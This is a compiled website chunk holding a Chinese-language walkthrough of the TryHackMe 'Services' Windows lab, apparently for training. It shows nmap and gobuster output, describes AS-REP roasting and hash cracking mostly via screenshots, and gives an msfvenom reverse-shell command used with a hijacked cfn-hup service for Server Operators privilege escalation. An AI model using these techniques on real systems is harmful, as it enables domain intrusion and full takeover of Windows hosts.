"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2304],{70189:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>a,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>c,toc:()=>p});var s=t(74848),i=t(28453);const r={sidebar_position:156,tags:["Easy","Windows","Kerberos AS-REP Rosating","\u7528\u6237\u7ec4"],title:"Services",description:"Services",sidebar_label:"Services",slug:"/tryhackme/156"},o="Services",c={id:"box/TryHackMe/156",title:"Services",description:"Services",source:"@site/docs/box/TryHackMe/156.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/156",permalink:"/docs/tryhackme/156",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Windows",permalink:"/docs/tags/windows"},{label:"Kerberos AS-REP Rosating",permalink:"/docs/tags/kerberos-as-rep-rosating"},{label:"\u7528\u6237\u7ec4",permalink:"/docs/tags/\u7528\u6237\u7ec4"}],version:"current",sidebarPosition:156,frontMatter:{sidebar_position:156,tags:["Easy","Windows","Kerberos AS-REP Rosating","\u7528\u6237\u7ec4"],title:"Services",description:"Services",sidebar_label:"Services",slug:"/tryhackme/156"},sidebar:"boxSidebar",previous:{title:"KoTH Hackers",permalink:"/docs/tryhackme/155"},next:{title:"DX1: Liberty Island",permalink:"/docs/tryhackme/157"}},a={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"88",id:"88",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"j.rock",id:"jrock",level:3},{value:"j.rock \u2014&gt; administrators",id:"jrock--administrators",level:3}];function l(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"services",children:"Services"}),"\n",(0,s.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-143-156:~/services# nmap -sTCV -p- --min-rate 1000 10.10.229.149\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-08 09:40 BST\nNmap scan report for ip-10-10-229-149.eu-west-1.compute.internal (10.10.229.149)\nHost is up (0.00034s latency).\nNot shown: 65506 closed ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Above Services\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-08 08:41:01Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=WIN-SERVICES.services.local\n| Not valid before: 2023-10-07T08:31:45\n|_Not valid after:  2024-04-07T08:31:45\n|_ssl-date: 2023-10-08T08:41:55+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  msrpc         Microsoft Windows RPC\n49694/tcp open  msrpc         Microsoft Windows RPC\n49702/tcp open  msrpc         Microsoft Windows RPC\n57359/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 02:F0:28:51:82:83 (Unknown)\nService Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: WIN-SERVICES, NetBIOS user: <unknown>, NetBIOS MAC: 02:f0:28:51:82:83 (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2023-10-08 09:41:55\n|_  start_date: 1600-12-31 23:58:45\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 104.66 seconds\n"})}),"\n",(0,s.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-143-156:~/services# gobuster dir -u http://10.10.229.149/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,asp,txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.229.149/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html,asp,txt\n[+] Timeout:        10s\n===============================================================\n2023/10/08 09:46:32 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/about.html (Status: 200)\n/img (Status: 301)\n/contact.html (Status: 200)\n/css (Status: 301)\n/About.html (Status: 200)\n/Contact.html (Status: 200)\n/Index.html (Status: 200)\n/courses.html (Status: 200)\n/pricing.html (Status: 200)\n/portfolio.html (Status: 200)\n/js (Status: 301)\n/fonts (Status: 301)\n/IMG (Status: 301)\n/INDEX.html (Status: 200)\n/Courses.html (Status: 200)\n/Fonts (Status: 301)\n/CSS (Status: 301)\n/Img (Status: 301)\n/JS (Status: 301)\n/Pricing.html (Status: 200)\n/Portfolio.html (Status: 200)\n/CONTACT.html (Status: 200)\n/COURSES.html (Status: 200)\n/ABOUT.html (Status: 200)\n===============================================================\n2023/10/08 09:48:34 Finished\n===============================================================\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u4ece\u76ee\u5f55\u626b\u63cf\u4e2d\u6211\u5e76\u6ca1\u6709\u83b7\u53d6\u5230\u4efb\u4f55\u6709\u6548\u7684\u5185\u5bb9, \u63a5\u7740\u6211\u5f00\u59cb\u4e86\u67e5\u627e\u7f51\u9875\u5185\u5bb9, \u5728\u7f51\u9875\u7684\u4e0b\u65b9\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a\u90ae\u7bb1"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-191949.png",alt:"image-20240709191947442"})}),"\n",(0,s.jsx)(e.p,{children:"\u540c\u65f6\u5728\u67e5\u770b\u7f51\u7ad9\u4e0a\u6807\u6ce8\u7684\u5185\u90e8\u5458\u5de5\u65f6\u6211\u53d1\u73b0"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u8fd9\u91cc\u7684 Joanne Doe \u597d\u50cf\u5bf9\u7684\u5c31\u662f\u6211\u4eec\u4e0a\u9762\u7684\u90ae\u7bb1"}),"\n",(0,s.jsx)(e.li,{children:"\u5982\u679c\u4e0a\u4e00\u4e2a\u5224\u65ad\u6b63\u786e, \u90a3\u4e48\u4e0b\u4e00\u6b65\u6211\u4eec\u5c31\u53ef\u4ee5\u521b\u5efa\u51fa\u6240\u6709\u7528\u6237\u7684\u5185\u90e8\u540d\u79f0"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-191955.png",alt:"image-20240709191953890"})}),"\n",(0,s.jsx)(e.h2,{id:"88",children:"88"}),"\n",(0,s.jsx)(e.p,{children:"\u5728\u83b7\u53d6\u5230\u7528\u6237\u7684\u5185\u90e8\u540d\u79f0\u4ee5\u53ca\u57df\u540d\u540e\u6211\u5f00\u59cb\u4e86 kerberos \u7684\u5229\u7528"}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsxs)(e.li,{children:["\n",(0,s.jsx)(e.p,{children:"\u6211\u5bf9\u53d1\u73b0\u7684\u7528\u6237\u8fdb\u884c\u4e86\u9a8c\u8bc1,\u53d1\u73b0\u7528\u6237\u5168\u90e8\u6b63\u786e"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192004.png",alt:"image-20240709192002589"})}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["\n",(0,s.jsx)(e.p,{children:"\u6211\u5c1d\u8bd5\u91cc AS-REP \u653b\u51fb, \u83b7\u53d6\u5230\u5176\u4e2d\u4e00\u4e2a\u7528\u6237\u7684 Session key"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192011.png",alt:"image-20240709192009795"})}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["\n",(0,s.jsx)(e.p,{children:"\u8fdb\u884c\u89e3\u5bc6"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192018.png",alt:"image-20240709192016588"})}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u672c\u6765\u6211\u8fd8\u8ba1\u5212 SPN \u6253\u4e00\u4e0b, \u4f46\u662f\u6ca1\u6d88\u606f\u6240\u4ee5\u5c31\u653e\u5f03\u4e86\u76f4\u63a5\u5c1d\u8bd5\u767b\u9646"}),"\n",(0,s.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(e.h3,{id:"jrock",children:"j.rock"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192036.png",alt:"image-20240709192034501"})}),"\n",(0,s.jsx)(e.h3,{id:"jrock--administrators",children:"j.rock \u2014> administrators"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192047.png",alt:"image-20240709192045861"})}),"\n",(0,s.jsx)(e.p,{children:"\u4ece\u4e0a\u9762\u53d1\u73b0\u7528\u6237 j.rock \u5c5e\u4e8e\u4e00\u4e2a\u7279\u6b8a\u7684\u7528\u6237\u7ec4 Server Operators ,"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192059.png",alt:"image-20240709192057920"})}),"\n",(0,s.jsxs)(e.p,{children:["\u56e0\u6b64\u6211\u4fbf\u5f00\u59cb\u67e5\u627e\u76f8\u5173\u7684\u5229\u7528\u6587\u7ae0 ",(0,s.jsx)(e.a,{href:"https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/",children:"Windows Privilege Escalation: Server Operator Group - Hacking Articles"})," \u4f7f\u7528 services \u547d\u4ee4\u6211\u4eec\u53ef\u4ee5\u5217\u51fa\u6240\u6709\u7684\u670d\u52a1"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192109.png",alt:"image-20240709192108002"})}),"\n",(0,s.jsx)(e.p,{children:"\u6211\u4eec\u5728\u8fd9\u91cc\u4f7f\u7528 cfn-hup \u670d\u52a1\u8fdb\u884c\u64cd\u4f5c"}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsxs)(e.li,{children:["\n",(0,s.jsx)(e.p,{children:"\u751f\u6210\u6211\u4eec\u7684\u6728\u9a6c\u7a0b\u5e8f"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-143-156:~/services# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.143.156 LPORT=4444 -f exe > admin.exe\n"})}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["\n",(0,s.jsx)(e.p,{children:"\u8fdb\u884c\u4e0a\u4f20\u5e76\u4fee\u6539 cfn-hup \u7684\u914d\u7f6e,"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192116.png",alt:"image-20240709192115327"})}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Shell"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-192122.png",alt:"image-20240709192120525"})}),"\n"]}),"\n"]})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(l,{...n})}):l(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>o,x:()=>c});var s=t(96540);const i={},r=s.createContext(i);function o(n){const e=s.useContext(r);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:o(n.components),s.createElement(r.Provider,{value:e},n.children)}}}]);